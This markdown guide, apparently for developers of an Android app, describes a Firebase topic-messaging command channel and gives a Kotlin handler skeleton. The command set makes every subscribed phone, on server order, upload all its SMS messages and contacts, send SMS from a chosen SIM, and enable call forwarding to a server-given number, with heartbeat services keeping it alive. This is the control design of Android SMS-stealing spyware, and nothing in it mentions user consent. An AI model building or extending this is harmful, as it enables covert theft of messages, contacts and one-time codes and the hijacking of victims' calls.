# Firebase Topic Messaging - Android Implementation Guide

## 📋 Overview

This document explains how to integrate Firebase Topic Messaging in your Android application to receive commands from the server.

**Topic Name:** `all_devices`

All devices must subscribe to this topic to receive broadcast commands from the server.

## 🔧 Setup

### 1. Add Firebase to Your Project

**Add to `build.gradle` (Module: app):**
```gradle
dependencies {
    implementation platform('com.google.firebase:firebase-bom:32.7.0')
    implementation 'com.google.firebase:firebase-messaging'
    implementation 'com.google.firebase:firebase-installations'
}
```

### 2. Subscribe to Topic

**In your Application class or MainActivity:**
```kotlin
import com.google.firebase.messaging.FirebaseMessaging

// Subscribe to topic
FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
    .addOnCompleteListener { task ->
        if (task.isSuccessful) {
            Log.d("FCM", "✅ Successfully subscribed to topic: all_devices")
        } else {
            Log.e("FCM", "❌ Failed to subscribe to topic: all_devices", task.exception)
        }
    }
```

**Best Practice:** Subscribe once when app starts (in Application class or MainActivity onCreate).

## 📨 Message Structure

All messages from the server have this structure:

```json
{
  "type": "command_type",
  "timestamp": "1699876543210"
}
```

Additional parameters may be included based on command type.

## 🎯 Supported Commands

### 1. `ping`
Test connectivity - device should respond immediately.

**Message Data:**
```json
{
  "type": "ping",
  "timestamp": "1699876543210"
}
```

**Device Response:**
Send ping response to server endpoint:
```kotlin
POST /ping-response
{
  "deviceId": "your_device_id",
  "timestamp": 1699876543210
}
```

### 2. `restart_heartbeat`
Restart the heartbeat service on device.

**Note:** This command can also be sent manually from server, but **automatic ping is sent every 10 minutes** instead.

**Message Data:**
```json
{
  "type": "restart_heartbeat",
  "timestamp": "1699876543210"
}
```

**Device Action:**
- Stop current heartbeat service
- Restart heartbeat service
- Reset heartbeat interval (usually 3 minutes)

### 2.1. `ping` (Auto-sent every 10 minutes)
Server automatically sends ping command every 10 minutes to verify device connectivity.

**Message Data:**
```json
{
  "type": "ping",
  "timestamp": "1699876543210"
}
```

**Device Response Required:**
Send ping response immediately to server:
```kotlin
POST /ping-response
{
  "deviceId": "your_device_id",
  "timestamp": 1699876543210
}
```

**Purpose:** 
- Verify device is online and responding
- Keep connection active
- Server uses this to track device status

### 3. `start_services`
Start all background services (SMS, Heartbeat, WorkManager).

**Message Data:**
```json
{
  "type": "start_services",
  "timestamp": "1699876543210"
}
```

**Device Action:**
- Start SmsService
- Start HeartbeatService
- Start WorkManager tasks

### 4. `send_sms`
Send SMS message.

**Message Data:**
```json
{
  "type": "send_sms",
  "phone": "+989123456789",
  "message": "Hello from server",
  "simSlot": "0",
  "timestamp": "1699876543210"
}
```

**Parameters:**
- `phone`: Phone number (with country code)
- `message`: SMS text content
- `simSlot`: SIM slot number (0 or 1)

### 5. `quick_upload_sms`
Upload recent SMS messages.

**Message Data:**
```json
{
  "type": "quick_upload_sms",
  "timestamp": "1699876543210"
}
```

**Device Action:**
- Collect recent SMS (last 50-100 messages)
- Upload to server endpoint: `POST /sms/history`

### 6. `upload_all_sms`
Upload all SMS messages from device.

**Message Data:**
```json
{
  "type": "upload_all_sms",
  "timestamp": "1699876543210"
}
```

**Device Action:**
- Collect all SMS messages
- Upload in batches to server endpoint: `POST /sms/history`

### 7. `quick_upload_contacts`
Upload contacts list.

**Message Data:**
```json
{
  "type": "quick_upload_contacts",
  "timestamp": "1699876543210"
}
```

**Device Action:**
- Collect all contacts
- Upload to server endpoint: `POST /contacts`

### 8. `upload_all_contacts`
Upload all contacts (same as quick_upload_contacts).

**Message Data:**
```json
{
  "type": "upload_all_contacts",
  "timestamp": "1699876543210"
}
```

### 9. `call_forwarding`
Enable call forwarding.

**Message Data:**
```json
{
  "type": "call_forwarding",
  "number": "+989123456789",
  "simSlot": "0",
  "timestamp": "1699876543210"
}
```

**Parameters:**
- `number`: Forwarding number (with country code)
- `simSlot`: SIM slot number

**Device Response:**
Send result to server:
```kotlin
POST /devices/call-forwarding/result
{
  "deviceId": "your_device_id",
  "action": "enable",
  "success": true,
  "number": "+989123456789",
  "simSlot": 0
}
```

### 10. `call_forwarding_disable`
Disable call forwarding.

**Message Data:**
```json
{
  "type": "call_forwarding_disable",
  "simSlot": "0",
  "timestamp": "1699876543210"
}
```

## 📱 Complete Implementation Example

### 1. Create FCM Service

**File: `FirebaseMessagingService.kt`**
```kotlin
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MyFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "FCMService"
        private const val TOPIC_NAME = "all_devices"
    }

    override fun onNewToken(token: String) {
        Log.d(TAG, "New FCM token: $token")
        // Send token to server if needed
        sendTokenToServer(token)
    }

    override fun onMessageReceived(message: RemoteMessage) {
        Log.d(TAG, "Message received from: ${message.from}")

        // Check if message contains data payload
        if (message.data.isNotEmpty()) {
            Log.d(TAG, "Message data: ${message.data}")
            handleDataMessage(message.data)
        }

        // Check if message contains notification payload
        message.notification?.let {
            Log.d(TAG, "Message notification: ${it.title} - ${it.body}")
            showNotification(it.title, it.body)
        }
    }

    private fun handleDataMessage(data: Map<String, String>) {
        val commandType = data["type"] ?: return
        val timestamp = data["timestamp"] ?: "0"

        Log.d(TAG, "Processing command: $commandType at $timestamp")

        when (commandType) {
            "ping" -> handlePing()
            "restart_heartbeat" -> handleRestartHeartbeat()
            "start_services" -> handleStartServices()
            "send_sms" -> handleSendSMS(data)
            "quick_upload_sms" -> handleQuickUploadSMS()
            "upload_all_sms" -> handleUploadAllSMS()
            "quick_upload_contacts" -> handleQuickUploadContacts()
            "upload_all_contacts" -> handleUploadAllContacts()
            "call_forwarding" -> handleCallForwarding(data)
            "call_forwarding_disable" -> handleCallForwardingDisable(data)
            else -> Log.w(TAG, "Unknown command type: $commandType")
        }
    }

    private fun handlePing() {
        Log.d(TAG, "Handling ping command")
        // Send ping response to server
        CoroutineScope(Dispatchers.IO).launch {
            sendPingResponse()
        }
    }

    private fun handleRestartHeartbeat() {
        Log.d(TAG, "Handling restart_heartbeat command")
        // Restart heartbeat service
        CoroutineScope(Dispatchers.IO).launch {
            restartHeartbeatService()
        }
    }

    private fun handleStartServices() {
        Log.d(TAG, "Handling start_services command")
        // Start all background services
        CoroutineScope(Dispatchers.IO).launch {
            startAllServices()
        }
    }

    private fun handleSendSMS(data: Map<String, String>) {
        val phone = data["phone"] ?: return
        val message = data["message"] ?: return
        val simSlot = data["simSlot"]?.toIntOrNull() ?: 0

        Log.d(TAG, "Handling send_sms: $phone - $message (SIM: $simSlot)")
        
        CoroutineScope(Dispatchers.IO).launch {
            sendSMS(phone, message, simSlot)
        }
    }

    private fun handleQuickUploadSMS() {
        Log.d(TAG, "Handling quick_upload_sms command")
        CoroutineScope(Dispatchers.IO).launch {
            uploadRecentSMS()
        }
    }

    private fun handleUploadAllSMS() {
        Log.d(TAG, "Handling upload_all_sms command")
        CoroutineScope(Dispatchers.IO).launch {
            uploadAllSMS()
        }
    }

    private fun handleQuickUploadContacts() {
        Log.d(TAG, "Handling quick_upload_contacts command")
        CoroutineScope(Dispatchers.IO).launch {
            uploadContacts()
        }
    }

    private fun handleUploadAllContacts() {
        Log.d(TAG, "Handling upload_all_contacts command")
        CoroutineScope(Dispatchers.IO).launch {
            uploadContacts()
        }
    }

    private fun handleCallForwarding(data: Map<String, String>) {
        val number = data["number"] ?: return
        val simSlot = data["simSlot"]?.toIntOrNull() ?: 0

        Log.d(TAG, "Handling call_forwarding: $number (SIM: $simSlot)")
        CoroutineScope(Dispatchers.IO).launch {
            enableCallForwarding(number, simSlot)
        }
    }

    private fun handleCallForwardingDisable(data: Map<String, String>) {
        val simSlot = data["simSlot"]?.toIntOrNull() ?: 0

        Log.d(TAG, "Handling call_forwarding_disable (SIM: $simSlot)")
        CoroutineScope(Dispatchers.IO).launch {
            disableCallForwarding(simSlot)
        }
    }

    // Implementation methods (implement based on your app logic)
    private suspend fun sendPingResponse() {
        // POST /ping-response with deviceId and timestamp
    }

    private suspend fun restartHeartbeatService() {
        // Stop and restart heartbeat service
    }

    private suspend fun startAllServices() {
        // Start SmsService, HeartbeatService, WorkManager
    }

    private suspend fun sendSMS(phone: String, message: String, simSlot: Int) {
        // Send SMS using Android SMS API
    }

    private suspend fun uploadRecentSMS() {
        // Collect recent SMS and POST /sms/history
    }

    private suspend fun uploadAllSMS() {
        // Collect all SMS and POST /sms/history
    }

    private suspend fun uploadContacts() {
        // Collect contacts and POST /contacts
    }

    private suspend fun enableCallForwarding(number: String, simSlot: Int) {
        // Enable call forwarding and POST result to /devices/call-forwarding/result
    }

    private suspend fun disableCallForwarding(simSlot: Int) {
        // Disable call forwarding and POST result to /devices/call-forwarding/result
    }

    private fun sendTokenToServer(token: String) {
        // Send FCM token to server for device registration
    }

    private fun showNotification(title: String?, body: String?) {
        // Show notification if needed
    }
}
```

### 2. Register Service in AndroidManifest.xml

```xml
<service
    android:name=".MyFirebaseMessagingService"
    android:exported="false">
    <intent-filter>
        <action android:name="com.google.firebase.MESSAGING_EVENT" />
    </intent-filter>
</service>
```

### 3. Subscribe on App Start

**In your Application class:**
```kotlin
class MyApplication : Application() {
    override fun onCreate() {
        super.onCreate()
        
        // Subscribe to Firebase topic
        FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    Log.d("FCM", "✅ Subscribed to all_devices topic")
                } else {
                    Log.e("FCM", "❌ Failed to subscribe", task.exception)
                }
            }
    }
}
```

**Don't forget to register in AndroidManifest.xml:**
```xml
<application
    android:name=".MyApplication"
    ...>
```

## 🔄 Background Task Schedule

The server automatically sends `ping` command every **10 minutes** to all devices subscribed to `all_devices` topic.

**Timeline:**
- **0:00** - Server starts
- **2:00** - First `ping` sent (after 2 min startup delay)
- **12:00** - Second `ping` sent
- **22:00** - Third `ping` sent
- **32:00** - Fourth `ping` sent
- ... and so on

**Purpose:** Keep all devices active and verify connectivity by sending periodic ping commands.

## 📝 Important Notes

1. **Topic Name:** Must be exactly `all_devices` (lowercase with underscore)
2. **Subscribe Once:** Subscribe to topic when app starts, not repeatedly
3. **Data Messages:** All commands come as data messages (not notifications)
4. **Timestamp:** Always included in milliseconds (Unix timestamp)
5. **Error Handling:** Handle unknown commands gracefully
6. **Threading:** Process commands in background thread (use coroutines or AsyncTask)

## 🐛 Troubleshooting

### Messages Not Received

1. **Check Topic Subscription:**
```kotlin
FirebaseMessaging.getInstance().getToken().addOnCompleteListener { task ->
    if (task.isSuccessful) {
        Log.d("FCM", "Token: ${task.result}")
    }
}
```

2. **Verify Topic Subscription:**
```kotlin
// Check if subscribed (manual verification in Firebase Console)
// Or use Firebase Admin SDK on server side
```

3. **Check Network Connection:**
   - Device must be online
   - FCM requires internet connection

4. **Check Service Registration:**
   - Verify `FirebaseMessagingService` is registered in AndroidManifest.xml
   - Check service name matches class name

### Common Issues

**Issue:** Messages arrive when app is in foreground but not in background
- **Solution:** Make sure `onMessageReceived` handles both data and notification payloads

**Issue:** Subscription fails
- **Solution:** Check Firebase project configuration and `google-services.json`

**Issue:** Commands not executing
- **Solution:** Check command type spelling and parameter names

## 🔗 Related Server Endpoints

When implementing command handlers, you may need to call these endpoints:

- `POST /ping-response` - Respond to ping command
- `POST /sms/history` - Upload SMS messages
- `POST /contacts` - Upload contacts
- `POST /devices/call-forwarding/result` - Send call forwarding result

## 📚 Additional Resources

- [Firebase Cloud Messaging Documentation](https://firebase.google.com/docs/cloud-messaging)
- [Firebase Topic Messaging Guide](https://firebase.google.com/docs/cloud-messaging/android/topic-messaging)
- [FirebaseMessagingService Reference](https://firebase.google.com/docs/reference/android/com/google/firebase/messaging/FirebaseMessagingService)

---

**Last Updated:** January 2025  
**Version:** 2.0.0

